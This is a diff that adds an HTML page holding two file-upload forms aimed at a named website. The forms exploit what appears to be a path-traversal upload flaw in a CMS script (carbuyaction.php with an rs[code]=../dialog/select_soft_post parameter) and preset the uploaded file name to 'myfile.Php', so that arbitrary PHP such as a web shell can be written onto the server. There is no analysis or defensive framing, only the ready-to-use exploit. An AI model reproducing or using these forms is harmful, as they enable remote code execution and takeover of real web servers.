@@ -1,0 +1,6 @@
+<form action="" method="post" enctype="multipart/form-data" name="QuickSearch" id="QuickSearch" onsubmit="addaction();"> <input type="text" value="http://www.wsdxs.cn/plus//carbuyaction.php?dopost=memclickout&oid=S-P0RN8888&rs[code]=../dialog/select_soft_post" name="doaction" style="width:800"><br /> file:<input name="uploadfile" type="file" /><br> newname:<input name="newname" type="text" value="myfile.Php"/> <input type="submit" value="提交" name="QuickSearchBtn"><br /> </form> <script> function addaction() { document.QuickSearch.action=document.QuickSearch.doaction.value; } </script>
+
+
+
+
+<form action="http://www.wsdxs.cn/plus//carbuyaction.php?dopost=memclickout&oid=S-P0RN8888&rs[code]=../dialog/select_soft_post" method="post" enctype="multipart/form-data" name="form1"> file:<input name="uploadfile" type="file" /><br> newname:<input name="newname" type="text" value="myfile.Php"/> <button class="button2" type="submit">提交</button><br><br>
